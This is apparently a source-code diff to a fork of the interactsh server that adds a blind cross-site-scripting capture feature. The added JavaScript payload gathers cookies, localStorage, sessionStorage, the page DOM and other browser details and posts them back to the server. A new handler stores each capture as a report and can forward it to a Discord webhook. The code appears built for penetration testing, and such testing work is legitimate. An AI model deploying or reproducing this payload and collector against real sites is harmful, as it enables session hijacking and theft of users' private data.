@@ -1,9 +1,13 @@
 package server
 
 import (
+	"crypto/rand"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
+	"html/template"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -30,6 +34,7 @@ type HTTPServer struct {
 	customBanner    string
 	defaultResponse string
 	staticHandler   http.Handler
+	xssPayload      string
 }
 
 type noopLogger struct {
@@ -79,8 +84,22 @@ func NewHTTPServer(options *Options) (*HTTPServer, error) {
 			server.defaultResponse = string(data)
 		}
 	}
+	// Set up XSS payload for "/" endpoint
+	if options.XSSDir != "" {
+		server.xssPayload = defaultXSSPayload
+		if server.customBanner != "" {
+			server.xssPayload = server.customBanner
+			server.customBanner = ""
+		}
+		abs, _ := filepath.Abs(options.XSSDir)
+		if err := os.MkdirAll(abs, 0755); err != nil {
+			return nil, fmt.Errorf("could not create xss directory %s: %s", abs, err)
+		}
+		gologger.Info().Msgf("XSS pingback directory: %s", abs)
+	}
 	router := &http.ServeMux{}
 	router.Handle("/", server.logger(server.corsMiddleware(http.HandlerFunc(server.defaultHandler))))
+	router.Handle("/x/", server.logger(server.corsMiddleware(http.HandlerFunc(server.xssHandler))))
 	router.Handle("/register", server.corsMiddleware(server.authMiddleware(http.HandlerFunc(server.registerHandler))))
 	router.Handle("/deregister", server.corsMiddleware(server.authMiddleware(http.HandlerFunc(server.deregisterHandler))))
 	router.Handle("/poll", server.corsMiddleware(server.authMiddleware(http.HandlerFunc(server.pollHandler))))
@@ -231,12 +250,81 @@ func (h *HTTPServer) handleInteraction(r *http.Request, uniqueID, fullID, reqStr
 
 const banner = `<h1> Interactsh Server </h1>
 
-<a href='https://github.com/projectdiscovery/interactsh'><b>Interactsh</b></a> is an open-source tool for detecting out-of-band interactions. It is a tool designed to detect vulnerabilities that cause external interactions.<br><br>
+<a href='https://github.com/ounissi-zakaria/interactsh'><b>Interactsh</b></a> is an open-source tool for detecting out-of-band interactions. It is a tool designed to detect vulnerabilities that cause external interactions.<br><br>
 
 If you notice any interactions from <b>*.%s</b> in your logs, it's possible that someone (internal security engineers, pen-testers, bug-bounty hunters) has been testing your application.<br><br>
 
 You should investigate the sites where these interactions were generated from, and if a vulnerability exists, examine the root cause and take the necessary steps to mitigate the issue.
 `
+
+const defaultXSSPayload = `(function(){
+var ls={};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls[k]=localStorage.getItem(k);}}catch(e){}
+var ss={};try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k);}}catch(e){}
+var d={
+url:document.location.href,
+cookie:document.cookie,
+domain:document.domain,
+referrer:document.referrer,
+ua:navigator.userAgent,
+title:document.title,
+dom:document.documentElement?document.documentElement.outerHTML.substring(0,50000):'',
+localStorage:ls,
+sessionStorage:ss
+};
+var x=new XMLHttpRequest();
+x.open('POST','/x/',true);
+x.setRequestHeader('Content-Type','application/json');
+x.send(JSON.stringify(d));
+})();`
+
+const xssPingbackHTML = `<!DOCTYPE html>
+<html>
+<head><title>XSS Pingback - {{.ID}}</title>
+<style>
+body{font-family:monospace;margin:2em;background:#1a1a2e;color:#e0e0e0}
+h1{color:#e94560;border-bottom:1px solid #e94560}
+h2{color:#e94560}
+table{border-collapse:collapse;width:100%;margin:1em 0}
+td,th{border:1px solid #333;padding:8px;text-align:left}
+th{background:#16213e;color:#e94560}
+.dom{background:#16213e;padding:1em;overflow:auto;white-space:pre-wrap;word-break:break-all;max-height:600px;border:1px solid #333}
+</style>
+</head>
+<body>
+<h1>XSS Pingback Report</h1>
+<table>
+<tr><th>ID</th><td>{{.ID}}</td></tr>
+<tr><th>Timestamp</th><td>{{.Timestamp}}</td></tr>
+<tr><th>Remote Address</th><td>{{.RemoteAddress}}</td></tr>
+</table>
+<h2>Request Headers</h2>
+<table>
+{{range .Headers}}
+<tr><td>{{.Key}}</td><td>{{.Value}}</td></tr>
+{{end}}
+</table>
+<h2>Captured Data</h2>
+<table>
+{{range .Captured}}
+<tr><td>{{.Key}}</td><td>{{.Value}}</td></tr>
+{{end}}
+</table>
+<h2>DOM</h2>
+<div class="dom">{{.DOM}}</div>
+<h2>localStorage</h2>
+<table>
+{{range .LocalStorage}}
+<tr><td>{{.Key}}</td><td>{{.Value}}</td></tr>
+{{end}}
+</table>
+<h2>sessionStorage</h2>
+<table>
+{{range .SessionStorage}}
+<tr><td>{{.Key}}</td><td>{{.Value}}</td></tr>
+{{end}}
+</table>
+</body>
+</html>`
 
 func extractServerDomain(h *HTTPServer, req *http.Request) string {
 	if h.options.HeaderServer != "" {
@@ -302,7 +390,10 @@ func (h *HTTPServer) defaultHandler(w http.ResponseWriter, req *http.Request) {
 		}
 		h.staticHandler.ServeHTTP(w, req)
 	} else if req.URL.Path == "/" && reflection == "" {
-		if h.customBanner != "" {
+		if h.xssPayload != "" {
+			w.Header().Set("Content-Type", "application/javascript")
+			_, _ = fmt.Fprint(w, h.xssPayload)
+		} else if h.customBanner != "" {
 			_, _ = fmt.Fprint(w, strings.ReplaceAll(h.customBanner, "{DOMAIN}", domain))
 		} else {
 			_, _ = fmt.Fprintf(w, banner, domain)
@@ -322,6 +413,152 @@ func (h *HTTPServer) defaultHandler(w http.ResponseWriter, req *http.Request) {
 		}
 		_, _ = fmt.Fprintf(w, "<html><head></head><body>%s</body></html>", reflection)
 	}
+}
+
+type xssKV struct {
+	Key   string
+	Value string
+}
+
+type xssPingbackData struct {
+	ID             string
+	Timestamp      string
+	RemoteAddress  string
+	Headers        []xssKV
+	Captured       []xssKV
+	DOM            string
+	LocalStorage   []xssKV
+	SessionStorage []xssKV
+}
+
+func (h *HTTPServer) xssHandler(w http.ResponseWriter, req *http.Request) {
+	if h.options.XSSDir == "" {
+		http.NotFound(w, req)
+		return
+	}
+
+	id := strings.TrimPrefix(req.URL.Path, "/x/")
+
+	if req.Method == http.MethodGet {
+		if id == "" || strings.Contains(id, "/") || strings.Contains(id, "\\") {
+			http.NotFound(w, req)
+			return
+		}
+		filePath := filepath.Join(h.options.XSSDir, id+".html")
+		absPath, _ := filepath.Abs(filePath)
+		xssDirAbs, _ := filepath.Abs(h.options.XSSDir)
+		if !strings.HasPrefix(absPath, xssDirAbs+string(os.PathSeparator)) {
+			http.NotFound(w, req)
+			return
+		}
+		data, err := os.ReadFile(filePath)
+		if err != nil {
+			http.NotFound(w, req)
+			return
+		}
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		_, _ = w.Write(data)
+		return
+	}
+
+	if req.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	id = generateXSSID()
+	host, _, _ := net.SplitHostPort(req.RemoteAddr)
+	if realIP := req.Header.Get("X-Real-IP"); realIP != "" {
+		host = realIP
+	}
+
+	var headers []xssKV
+	for k, vs := range req.Header {
+		for _, v := range vs {
+			headers = append(headers, xssKV{Key: k, Value: v})
+		}
+	}
+
+	var captured []xssKV
+	var dom string
+	var localStorage []xssKV
+	var sessionStorage []xssKV
+	bodyBytes, _ := io.ReadAll(io.LimitReader(req.Body, 1<<20))
+	if len(bodyBytes) > 0 {
+		var parsed map[string]interface{}
+		if err := jsoniter.Unmarshal(bodyBytes, &parsed); err == nil {
+			for k, v := range parsed {
+				switch k {
+				case "dom":
+					if s, ok := v.(string); ok {
+						dom = s
+					}
+				case "localStorage":
+					if m, ok := v.(map[string]interface{}); ok {
+						for mk, mv := range m {
+							localStorage = append(localStorage, xssKV{Key: mk, Value: fmt.Sprintf("%v", mv)})
+						}
+					}
+				case "sessionStorage":
+					if m, ok := v.(map[string]interface{}); ok {
+						for mk, mv := range m {
+							sessionStorage = append(sessionStorage, xssKV{Key: mk, Value: fmt.Sprintf("%v", mv)})
+						}
+					}
+				default:
+					captured = append(captured, xssKV{Key: k, Value: fmt.Sprintf("%v", v)})
+				}
+			}
+		} else {
+			captured = append(captured, xssKV{Key: "raw_body", Value: string(bodyBytes)})
+		}
+	}
+
+	data := xssPingbackData{
+		ID:             id,
+		Timestamp:      time.Now().UTC().Format(time.RFC3339),
+		RemoteAddress:  host,
+		Headers:        headers,
+		Captured:       captured,
+		DOM:            dom,
+		LocalStorage:   localStorage,
+		SessionStorage: sessionStorage,
+	}
+
+	tmpl, err := template.New("xss").Parse(xssPingbackHTML)
+	if err != nil {
+		gologger.Warning().Msgf("Could not parse xss pingback template: %s\n", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	var buf strings.Builder
+	if err := tmpl.Execute(&buf, data); err != nil {
+		gologger.Warning().Msgf("Could not execute xss pingback template: %s\n", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	filePath := filepath.Join(h.options.XSSDir, id+".html")
+	if err := os.WriteFile(filePath, []byte(buf.String()), 0644); err != nil {
+		gologger.Warning().Msgf("Could not write xss pingback file: %s\n", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	gologger.Info().Msgf("XSS pingback saved: %s from %s\n", filePath, host)
+
+	if h.options.DiscordWebhook != "" {
+		go sendDiscordNotification(h.options.DiscordWebhook, data, req)
+	}
+
+	w.WriteHeader(http.StatusOK)
+}
+
+func generateXSSID() string {
+	b := make([]byte, 8)
+	_, _ = rand.Read(b)
+	return hex.EncodeToString(b)
 }
 
 // writeResponseFromDynamicRequest writes a response to http.ResponseWriter
